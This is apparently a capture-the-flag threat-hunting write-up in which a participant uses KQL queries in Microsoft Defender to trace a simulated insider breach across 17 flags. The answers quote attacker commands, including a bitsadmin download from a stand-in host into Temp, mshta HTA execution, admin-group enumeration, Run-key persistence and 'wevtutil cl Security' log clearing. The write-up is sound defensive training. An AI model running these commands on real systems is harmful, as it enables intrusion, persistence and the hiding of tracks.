 # 🎯 Threat-Hunting-Scenario-Papertrail

 <img width="400" src="https://github.com/user-attachments/assets/b9d1d752-b62f-41c6-a8d7-54f10e8355e6" alt="dark office with hoodied anonymous people."/>

**Participant:** Luka Groff

**Date:** 21 August 2025

## Platforms and Languages Leveraged

**Platforms:**

* Microsoft Defender for Endpoint (MDE)
* Log Analytics Workspace

**Languages/Tools:**

* Kusto Query Language (KQL) for querying device events, registry modifications, and persistence artifacts

---


 # 📖 **Scenario**

A sudden, unexplained promotion has triggered whispers across the executive floor. The recipient? A mid-level employee with no standout track record — at least, not one visible anymore.

Internal HR systems show signs of tampering: audit logs wiped, performance reports edited, and sensitive employee reviews quietly exfiltrated. Behind the scenes, someone has buried the real story beneath layers of obfuscation, PowerShell trickery, and stealthy file manipulation.

Your mission: act as a covert threat hunter tasked with dissecting the digital remnants of the breach. Trace the insider’s movements. Expose the fake artifacts. Reconstruct the timeline they tried to erase — and uncover the truth behind the promotion that should never have happened.

Nothing in the system adds up... unless you know where to look.

## Starting Point

Before you officially begin the flags, you must first determine where to start hunting. Identify where to start hunting with the following intel given: 

1. HR related stuffs or tools were recently touched, investigate any dropped scripts or configs over the mid-July weekends

🕵️ **Identify the first machine to look at**


Query used:
```
DeviceEvents
| where ActionType == "SensitiveFileRead"
```

🧠 **Thought process:** I immediately went searching for sensitive files read on the weekend mentioned in the scenario, around the 20th of July. I found some HR related files that were accessed by nathan-iel-vm. Later on the logs disappeared, so I could not take a screenshot then, but I found the newly created logs for the new vm n4thani3l-vm and took the screenshot of those.

<img width="600" src="https://github.com/user-attachments/assets/9dce0e98-f4d6-4a3c-9457-73bab7048c4f"/>


**Answer: nathan-iel-vm/n4thani3l-vm**

---

## 🟩 Flag 1 – Initial PowerShell Execution Detection

**Objective:**

Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.

**What to Hunt:**

Initial signs of PowerShell being used in a way that deviates from baseline usage.

**Thought:**

Understanding where it all began helps chart every move that follows. Look for PowerShell actions that started the chain.

**Hint:**

1. Who?

 🕵️ **Provide the creation time of the first suspicious process that occurred**

Query used:
```
DeviceProcessEvents
| where DeviceName == "nathan-iel-vm"
| where FileName == "powershell.exe" or InitiatingProcessFileName == "powershell.exe"
| project Timestamp, ProcessCommandLine, FileName, SHA256,InitiatingProcessFileName, AccountName, ProcessCreationTime
```

🧠 **Thought process:** The assignment specifically asks for Powershell execution and for the Process Creation Time, so I made sure to look into all the Powershell executions of nathaniel vm and their process creation times. The answer provided is based on the original logs, but the screenshot is of the new logs. But we can clearly see from the logs that someone got into the system, got remote access and the first thing he wanted to check was "who he is" with the command "whoami".

<img width="600" src="https://github.com/user-attachments/assets/1f4ac41e-7127-4701-8d41-83fb0f5254e3"/>

**Answer: 2025-07-19T02:07:43.9041721Z**

---

## 🟩 Flag 2 – Local Account Assessment

**Objective:**

Map user accounts available on the system.

**What to Hunt:**

PowerShell queries that enumerates local identities.

**Thought:**

After knowing their own access level, intruders start scanning the local account landscape to plan privilege escalation or impersonation down the line.

 🕵️ **Identify the associated SHA256 value of this particular instance**

Query used:
```
DeviceProcessEvents
| where DeviceName == "nathan-iel-vm"
| where FileName == "powershell.exe" or InitiatingProcessFileName == "powershell.exe"
| project Timestamp, ProcessCommandLine, FileName, SHA256,InitiatingProcessFileName, AccountName, ProcessCreationTime
```

🧠 **Thought process:** The query I used was the same as the first flag, because I could already see from the results from flag 1, that the attacker used "powershell.exe" -Command "Get-LocalUser | ForEach-Object { \"User: $($_.Name) | Enabled: $($_.Enabled)\" }" command to get the lay of the land of the local accounts.

<img width="600" src="https://github.com/user-attachments/assets/626eb342-4e88-4a56-a848-5a65a189910d"/>

**Answer: SHA256 = 9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3**

---

## 🟩 Flag 3 – Privileged Group Assessment

**Objective:**

Identify elevated accounts on the target system.

**What to Hunt:**

A method used to check for high-privilege users.

**Thought:**

Knowledge of who has admin rights opens doors for impersonation and deeper lateral movement.

 🕵️ **What is the value of the command?**

Query used:
```
DeviceProcessEvents
| where DeviceName == "nathan-iel-vm"
| where FileName == "powershell.exe" or InitiatingProcessFileName == "powershell.exe"
| project Timestamp, ProcessCommandLine, FileName, SHA256,InitiatingProcessFileName, AccountName, ProcessCreationTime
```

🧠 **Thought process:** The query is still the same, because it gives all the information needed to provide the answer for 1st, 2nd and 3rd flag


<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>

**Answer: "powershell.exe" net localgroup Administrators**

---

## 🟩 Flag 4 – Last Manual Access to File

**Objective:**

Track last read of sensitive document.

**What to Hunt:**

Last file open timestamp.

**Thought:**

Late-stage access usually precedes exfiltration — timeline alignment matters.


 🕵️ **Identify the last instance of the file access**

Query used: Same as flag 3


🧠 **Thought process:** From the results seen in flag 3, I got the Timestamp of the last file access.


<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>

**Answer: 2025-06-16T06:12:28.2856483Z**

---

## 🟩 Flag 5 – LOLBin Usage: bitsadmin

**Objective:**

Identify stealth download via native tools.

**What to Hunt:**

bitsadmin.exe with file transfer URL.

**Thought:**

Abusing trusted binaries helps attackers blend in — keep an eye on LOLBins.


 🕵️ **Provide the command value associated with the initial exploit**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
| where FileName contains "bitsadmin.exe"
| order by Timestamp asc
```

🧠 **Thought process:** I simply followed the hint and I got a straight answer in the logs.

<img width="250" src="https://github.com/user-attachments/assets/fd161361-da91-49b7-b3b6-10a559c48896"/>

**Answer: "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe**

---

## 🟩 Flag 6 – Suspicious Payload Deployment

**Objective:**

Identify dropped executable payloads that do not align with baseline software.

**What to Hunt:**

New files placed in Temp or uncommon locations, especially with misleading names.

**Thought:**

Payloads must land before they run. Watch Temp folders for staging signs.

**Hint:**

1. Book of financial accounts

 🕵️ **Identify the suspicious program**

Query used:

```
DeviceFileEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
| where FileName endswith ".exe"
| where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\")
| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

🧠 **Thought process:** I sorted the results by file name, that way it was easy to sift through the results and find the odd one out.

<img width="400" src="https://github.com/user-attachments/assets/8f2dce56-934b-4bd4-95b2-32f67088554c"/>

**Answer: ledger_viewer.exe**

---

## 🟩 Flag 7 – HTA Abuse via LOLBin

**Objective:**

Detect execution of HTML Application files using trusted Windows tools.

**What to Hunt:**

Execution via `mshta.exe` pointing to local HTA scripts.

**Thought:**

HTA-based execution is a social engineering favorite — it leverages trust and native execution.

 🕵️ **Provide the value of the command associated with the exploit**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has ".hta"
| project Timestamp, ProcessCommandLine, InitiatingProcessFileName, FolderPath, SHA256
| order by Timestamp asc
```

🧠 **Thought process:** The hints were good enough for me to find the results directly, where file name was mshta.exe and command line having .hta extensions

<img width="600" src="https://github.com/user-attachments/assets/a0c40640-28f7-45bc-9314-2a502cfef238"/>

**Answer: "mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta**

---

## 🟩 Flag 8 – ADS Execution Attempt

**Objective:**

Track if attackers stored payloads in Alternate Data Streams (ADS).

**What to Hunt:**

DLLs hidden in common file types like `.docx` with `:hidden.dll` behavior.

**Thought:**

ADS hides in plain sight — it’s a classic LOLBin trick to store malware where few would look.

**Hint:**

1. Capitalist

 🕵️ **Provide the SHA1 value associated**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15) .. datetime(2025-06-19))
| where InitiatingProcessCommandLine has ":"
| where InitiatingProcessCommandLine has ".dll"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA1
| order by Timestamp desc
```

🧠 **Thought process:** I filtered for the command line having ":" and ".dll" in it, according to the hint. The compattelrunner.exe sounds like Capitalist, so I figured it's the answer which it was. Upon further inspection, I could see that Write-Host 'Final result: 1' command was run before the compattelrunner.exe scan. It's faking the result of a scan — potentially to mimic a real system check or mislead defenders. Then, the second command does the actual .inf scan. This staged behavior is often seen in malware to print fake result (decoy), actually scan system or possibly drop drivers or persistence tools.

<img width="400" src="https://github.com/user-attachments/assets/97c83a1b-8bcc-4b15-ab39-c49512c362cd"/>

**Answer: 801262e122db6a2e758962896f260b55bbd0136a**

---

## 🟩 Flag 9 – Registry Persistence Confirmation

**Objective:**

Confirm that persistence was achieved via registry autorun keys.

**What to Hunt:**

Registry path and value that re-executes the attack script.

**Thought:**

Once in the registry, an attacker can survive reboots — making this a prime persistence marker.

 🕵️ **Provide the value of the registry tied to this particular exploit**

Query used:

```
DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where RegistryKey endswith @"CurrentVersion\Run"
     or RegistryKey endswith @"CurrentVersion\RunOnce"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

🧠 **Thought process:** I just looked for commands Run or RunOnce within the RegistryKey where these persistence methods usually are, and it gave me the answer.

<img width="800" src="https://github.com/user-attachments/assets/d6ceceae-d855-4dc6-a1ce-4f929e5e9dca"/>

**Answer: HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**

---

## 🟩 Flag 10 – Scheduled Task Execution

**Objective:**

Validate the scheduled task that launches the payload.

**What to Hunt:**

Name of the task tied to the attack’s execution flow.

**Thought:**

Even if stealthy, scheduled tasks leave clear creation trails. Look for unfamiliar task names.

 🕵️ **What is the name of the scheduled task created**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where FileName =~ "schtasks.exe" and ProcessCommandLine has "/create"
| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

🧠 **Thought process:** I looked for scheduled tasks and found what I was looking for and more.

<img width="800" src="https://github.com/user-attachments/assets/7af9ea77-36a4-48c3-8bfc-17522bb10838"/>

**Answer: MarketHarvestJob**

---

## 🟩 Flag 11 – Target of Lateral Movement

**Objective:**

Identify the remote machine the attacker pivoted to next.

**What to Hunt:**

Remote system name embedded in command-line activity.

**Thought:**

The attack is expanding. Recognizing lateral targets is key to containment.

 🕵️ **Drop the next compromised machine name**

Query used: same as flag 10

🧠 **Thought process:** In the previous flag I spotted lateral movement to a different machine as a scheduled task. I also noticed it at flag 2 where I looked into the SHA256.

<img width="800" src="https://github.com/user-attachments/assets/7af9ea77-36a4-48c3-8bfc-17522bb10838"/>

**Answer: centralsrvr**

---

## 🟩 Flag 12 – Lateral Move Timestamp

**Objective:**

Pinpoint the exact time of lateral move to the second system.

**What to Hunt:**

Execution timestamps of commands aimed at the new host.

**Thought:**

Timing matters — it allows us to reconstruct the attack window on the second host.

 🕵️ **When was the last lateral execution?**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has "C2.ps1"
```

🧠 **Thought process:** From the previous flag, I gathered enough evidence to jump directly to the lateral movement execution with the above query.

<img width="250" src="https://github.com/user-attachments/assets/67306d9b-279b-45a5-83a1-df6a47c916c1"/>

**Answer: 2025-06-17T03:00:49.525038Z**

---

## 🟩 Flag 13 – Sensitive File Access

**Objective:**

Reveal which specific document the attacker was after.

**What to Hunt:**

Verify if the attackers were after a similar file

**Thought:**

The goal is rarely just control — it’s the data. Identifying what they wanted is vital.

**Hint:**

1. Utilize previous findings

 🕵️ **Provide the standard hash value associated with the file**

Query used:

```
DeviceFileEvents
| where DeviceName == "centralsrvr"
| where FileName == "QuarterlyCryptoHoldings.docx"
| project Timestamp, FileName, SHA256, FolderPath, InitiatingProcessFileName
```

🧠 **Thought process:** I assumed, according to the hint, that the file they were after was the same one as in flag 3, so I jumped directly to that file and got the SHA256 of the QuarterlyCryptoHoldings.docx file.

<img width="400" src="https://github.com/user-attachments/assets/58ec4895-d925-4468-b5b2-9c5109d7ffac"/>

**Answer: b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98**

---

## 🟩 Flag 14 – Data Exfiltration Attempt

**Objective:**

Validate outbound activity by hashing the process involved.

**What to Hunt:**

Process hash related to exfiltration to common outbound services.

**Thought:**

Exfil isn’t just about the connection — process lineage shows who initiated the theft.

 🕵️ **Provide the associated MD5 value of the exploit**

Query used:

```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where RemoteIPType == "Public"
| where RemoteUrl != ""
| where InitiatingProcessCommandLine contains "exfiltrate"
| project Timestamp, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessMD5
```

🧠 **Thought process:** This flag was a little bit of a challenge, but I sifted through a lot of files throughout the hunt, where I found some exfiltratedata.ps1 executables, but was not sure if it was there for just noise or to throw me off. I played around with the KQL to lower the amount of logs shown and found that the above-mentioned executable was actually the one responsible for exfiltration.

<img width="600" src="https://github.com/user-attachments/assets/cb9dd4b7-2e56-47c9-b6fb-09e902e1fcf6"/>

**Answer: 2e5a8590cf6848968fc23de3fa1e25f1**

---

## 🟩 Flag 15 – Destination of Exfiltration

**Objective:**

Identify final IP address used for data exfiltration.

**What to Hunt:**

Remote IPs of known unauthorized cloud services.

**Thought:**

Knowing where data went informs response and informs IR/containment scope.

 🕵️ **Identify the IP of the last outbound connection attempt**

Query used:

```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where RemoteIPType == "Public"
| where RemoteUrl != ""
| where RemoteUrl in~ (
   "drive.google.com",
   "dropbox.com",
   "www.dropbox.com",
   "pastebin.com",
   "dw8wjz3q0i4gj.cloudfront.net",
   "o.ss2.us"
)
| project Timestamp, DeviceName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, InitiatingProcessSHA256
| sort by Timestamp desc
```

🧠 **Thought process:** I filtered for the remote URLs that I noticed could be a third-party unauthorized cloud service, and I only had 4 IPs to choose from, and in the end, it was the IP of pastebin.com

<img width="600" src="https://github.com/user-attachments/assets/4db9f414-56df-4e73-b30c-cd5d664bae8d"/>

**Answer: 104.22.69.199**

---

## 🟩 Flag Flag 16 – PowerShell Downgrade Detection

**Objective:**

Spot PowerShell version manipulation to avoid logging.

**What to Hunt:**

`-Version 2` execution flag in process command lines.

**Thought:**

This signals AMSI evasion — it’s a red flag tactic to bypass modern defenses.

 🕵️ **When was a downgrade attempt executed?**

Query used:

```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "-Version 2"
```

🧠 **Thought process:** This was a pretty straightforward flag since the hints gave away what to look for. Once I queried the -Version 2 in the process command line, I had my answer.

<img width="300" src="https://github.com/user-attachments/assets/a501e571-2329-48cf-8df4-edbbb27855ef"/>

**Answer: 2025-06-18T10:52:59.0847063Z**

---

## 🟩 Flag 17 – Log Clearing Attempt

**Objective:**

Catch attacker efforts to cover their tracks.

**What to Hunt:**

Use of `wevtutil cl Security` to clear event logs.

**Thought:**

Cleaning logs shows intent to persist without a trace — it's often one of the final steps before attacker exit.

 🕵️ **Identify the process creation date**

Query used:

```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine has_any ("wevtutil", "cl Security")
```

🧠 **Thought process:** The last flag was, at a glance, very simple, but it had a little twist to it. I found what I was looking for immediately, but I had trouble giving in the right time. The question was set as "identifying the process creation time" and not just a Timestamp. At a glance, these two times look the same, so I always just posted the Timestamp time, but after countless hours of questioning myself, I realized what the question is actually asking for.

<img width="250" src="https://github.com/user-attachments/assets/460a7771-351e-4171-9ef6-dbf9118880ad"/>

**Answer: 2025-06-18T10:52:33.3030998Z**

---

## ✅ Conclusion

The attacker leveraged native tools and LOLBins to evade detection, accessed high-value documents, and stealthily exfiltrated them while maintaining persistence. The clean logs indicate deliberate obfuscation and anti-forensic effort.

🛡️ **Recommendations**

	•	Block LOLBins like bitsadmin, mshta via AppLocker or WDAC
	•	Enable script block logging and AMSI
	•	Monitor for PowerShell downgrade attempts (-Version 2)
	•	Watch for registry changes in autorun paths
	•	Alert on suspicious scheduled task creation
	•	Monitor public cloud uploads (e.g. Dropbox, Pastebin)


“Attackers hide in noise. But sometimes, they hide in silence.”
